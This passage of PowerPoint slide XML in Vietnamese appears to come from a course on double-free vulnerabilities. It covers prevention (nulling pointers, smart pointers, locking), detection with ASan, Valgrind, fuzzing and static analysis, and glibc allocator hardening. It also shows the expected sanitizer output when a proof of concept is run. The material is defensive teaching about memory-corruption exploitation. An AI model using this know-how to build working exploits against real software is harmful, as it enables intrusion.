            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="1581912"/>
            <a:ext cx="2756916"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GÁN NULL NGAY SAU FREE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="1874520"/>
            <a:ext cx="2756916" cy="1719072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(NULL)</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> hợp lệ theo chuẩn C: cách rẻ nhất chặn phần lớn case thực tế</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="3931920"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="4096512"/>
            <a:ext cx="27569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MỘT NƠI DỌN DẸP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="4389120"/>
            <a:ext cx="2756916" cy="1719072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không free trong nhánh lỗi rồi free lại ở cleanup chung; chọn một trong hai</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8609076" y="3931920"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="4096512"/>
            <a:ext cx="27569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C++ VÀ ĐA LUỒNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="4389120"/>
            <a:ext cx="2756916" cy="1719072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unique_ptr</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>shared_ptr</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> thay con trỏ thô; nhiều thread thì refcount atomic hoặc lock quanh free (bài học CVE-2025-62215)</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Tầng công cụ: phát hiện trước khi ship</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7 · 9.2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="3605784" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="158191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CÔNG CỤ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="3240024"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AddressSanitizer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2331720"/>
            <a:ext cx="3240024" cy="1261872"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>-fsanitize=address</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: bắt double free/UAF khi chạy, in stack trace cả hai lần free; nên bật trong CI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="1417320"/>
            <a:ext cx="3605784" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="158191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CÔNG CỤ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="1874520"/>
            <a:ext cx="3240024"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Valgrind memcheck</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="2331720"/>
            <a:ext cx="3240024" cy="1261872"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>--tool=memcheck</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: chậm hơn ASan nhưng không cần biên dịch lại</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="1417320"/>
            <a:ext cx="3605784" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="158191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CÔNG CỤ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="1874520"/>
            <a:ext cx="3240024"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MALLOC_CHECK_=3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="2331720"/>
            <a:ext cx="3240024" cy="126187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Kiểm tra heap runtime của glibc, nhẹ hơn ASan, dùng được với binary đã build sẵn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="3605784" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="409651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CÔNG CỤ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4389120"/>
            <a:ext cx="3240024"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Static analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4846320"/>
            <a:ext cx="3240024" cy="126187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Clang Static Analyzer, Coverity, Cppcheck: bắt pattern tĩnh, hữu ích cho nhánh lỗi chưa có test</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="3931920"/>
            <a:ext cx="3605784" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="4096512"/>
            <a:ext cx="3240024"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CÔNG CỤ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="4389120"/>
            <a:ext cx="3240024" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Fuzzing + ASan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="4846320"/>
            <a:ext cx="3240024" cy="126187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libFuzzer, AFL++: hiệu quả nhất với double free chỉ lộ ra ở input hoặc lịch trình thread cụ thể</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="3931920"/>
            <a:ext cx="3605784" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="4041648"/>
            <a:ext cx="3240024" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MONG ĐỢI KHI CHẠY POC 5.5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="4343400"/>
            <a:ext cx="3240024" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>gcc -g -fsanitize=address \</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    poc.c -o poc_asan</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./poc_asan AAAA</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 ERROR: AddressSanitizer:</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   attempting double-free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>valgrind ./poc AAAA</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 Invalid free()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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Tầng allocator và tầng vận hành</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7 · 9.3 · 9.4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5486400" cy="27432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9.3 · GIẢM THIỆT HẠI KHI LỖI ĐÃ LỌT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5486400" cy="27432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9.4 · GIẢM BLAST RADIUS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1783080"/>
            <a:ext cx="5522976" cy="1325880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5517"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="194767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GLIBC HIỆN ĐẠI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2240280"/>
            <a:ext cx="5157216" cy="75895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tcache key + safe-linking nâng chi phí khai thác, không thay được code đúng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3291840"/>
            <a:ext cx="5522976" cy="1325880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5517"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="345643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HARDENED ALLOCATOR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3749040"/>
            <a:ext cx="5157216" cy="758952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
